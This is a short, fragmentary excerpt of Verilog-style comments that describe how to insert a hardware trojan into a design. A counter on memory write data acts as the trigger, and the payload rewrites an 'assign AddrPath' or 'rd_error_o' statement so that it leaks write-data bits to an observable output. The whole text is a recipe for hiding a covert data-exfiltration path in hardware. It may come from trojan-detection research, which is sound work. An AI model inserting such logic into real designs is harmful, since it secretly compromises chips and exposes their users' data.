 ...
 *   
 * Trigger: Counter on memAccessWriteData
 * Payload: Route AddrPath[0] to observable output
 * 
...
//   Find the assign for AddrPath (or rd_error_o as fallback):
//     assign AddrPath = <normal_expr>;
//   Replace with:
//     assign AddrPath = trojan_active ? memAccessWriteData[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? memAccessWriteData[0] : 1'b0;
//
